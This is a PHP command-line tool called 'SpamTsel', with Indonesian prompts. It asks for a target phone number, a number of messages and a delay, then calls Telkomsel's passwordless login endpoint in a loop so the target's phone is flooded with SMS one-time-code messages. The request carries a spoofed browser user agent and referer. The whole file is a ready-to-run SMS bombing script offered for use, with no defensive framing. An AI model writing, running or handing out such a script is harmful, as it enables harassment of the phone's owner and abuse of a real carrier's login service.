<?php
function telkbomb($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
echo "\033[0;32m ____                      _____         _
/ ___| _ __   __ _ _ __ __|_   _|__  ___| |
\___ \| '_ \ / _` | '_ ` _ \| |/ __|/ _ \ |
 ___) | |_) | (_| | | | | | | |\__ \  __/ |
|____/| .__/ \__,_|_| |_| |_|_||___/\___|_| 
      |_|
Author : RANDIOLOY\n";
echo "\033[0;37m┌─[\033[31;1mMasukkan Nomor Target Ex:08xxx\033[0;37m]\n└─[\033[31;1m$\033[0;37m]> \033[36;1m";
$nomor = trim(fgets(STDIN));
echo "\033[0;37m┌─[\033[31;1mMasukkan Jumlah Spam\033[0;37m]\n└─[\033[31;1m$\033[0;37m]> \033[36;1m";
$jumlah = trim(fgets(STDIN));
echo "\033[0;37m┌─[\033[31;1mMasukkan Jeda\033[0;37m]\n└─[\033[31;1m$\033[0;37m]> \033[36;1m";
$jeda = trim(fgets(STDIN));
$execute = telkbomb($nomor, $jumlah, $jeda);
print $execute;
?>